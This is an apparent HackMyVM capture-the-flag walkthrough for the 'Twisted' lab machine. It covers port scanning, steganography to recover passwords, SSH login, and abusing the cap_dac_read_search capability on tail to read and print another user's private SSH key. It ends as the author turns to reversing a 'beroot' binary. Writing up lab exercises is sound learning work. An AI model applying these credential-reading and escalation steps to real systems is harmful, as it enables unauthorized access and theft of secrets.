# HackMyVM machine
## Twisted
### Machine description
  - Machine in HackMyVM: [Twisted](https://hackmyvm.eu/machines/machine.php?vm=Twisted)
  - Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
  - Machine difficulty: Easy

<img src="photo.png" alt="Twisted Logo" width="300"/>

`arp-scan -l`:

```
192.168.1.66	08:00:27:9b:d8:c8
```

`nmap -p- -sC -sV 192.168.1.66`:

```
Nmap scan report for 192.168.1.66 (192.168.1.66)
Host is up (0.00035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:63:a0:c9:8b:7a:f3:42:ac:49:ab:a6:a7:3f:fc:ee (RSA)
|   256 8c:ce:87:47:f8:b8:1a:1a:78:e5:b7:ce:74:d7:f5:db (ECDSA)
|_  256 92:94:66:0b:92:d3:cf:7e:ff:e8:bf:3c:7b:41:b7:5a (ED25519)
MAC Address: 08:00:27:9B:D8:C8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Go on the 80 port:

<img src="photo1.png" width="1000"/>

We can see 2 photos, lets download them:

`wget http://192.168.1.66/cat-original.jpg`

`wget http://192.168.1.66/cat-hidden.jpg`


<img src="photo2.png" width="500"/>

Now lets try stenography

```
stegseek cat-hidden.jpg
```

```
stegseek cat-original.jpg
```

We got two files:

<img src="photo3.png" width="400"/>

We can see two users, markus and mateo.
Now lets read files:

`cat cat-original.jpg.out`
`cat cat-hidden.jpg.out`

<img src="photo4.png" width="400"/>

It seems like we have passwords now.
Lets connect to markus on ssh port

`ssh markus@192.168.1.66`

We got connect and we see note.txt
It says:

`Hi bonita,
I have saved your id_rsa here: /var/cache/apt/id_rsa
Nobody can find it.`

So lets try read id_rsa

`cat: id_rsa: Permission denied`

We cant read it, lets try linpeas

`./linpeas.sh`:


<img src="photo5.png" width="400"/>

The cap_dac_read_search capability allows us to bypass discretionary access controls to read and search any file or directory.
Lets use it.

`/usr/bin/tail -n 100 /var/cache/apt/id_rsa`:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd
FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS
olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1
vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF
gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C
tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM
gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC
xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8
DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H
uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD
XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu
U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI
mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/
hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro
nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK
mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+
bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq
yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP
UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh
V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ
LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz
a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF
eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu
D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

We got the key, lets connect to the bonita

`ssh bonita@192.168.1.66 -p 2222 -i id_rsa`

Now im bonita, and i see beroot file
`./beroot`:

```
bonita@twisted:~$ ./beroot 
Enter the code:
 3

WRONG
bonita@twisted:~$ 
```

Lets download it, and use exiftool

`exiftool beroot`:

```
ExifTool Version Number         : 12.57
File Name                       : beroot
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2020:10:14 03:23:16-04:00
File Access Date/Time           : 2025:01:25 11:48:12-05:00
File Inode Change Date/Time     : 2025:01:25 11:46:33-05:00
File Permissions                : -rwxr-xr-x
File Type                       : ELF shared library
File Type Extension             : so
MIME Type                       : application/octet-stream
CPU Architecture                : 64 bit
CPU Byte Order                  : Little endian
Object File Type                : Shared object file
CPU Type                        : AMD x86-64
```

It's ELF shared library, so lets try ghidra














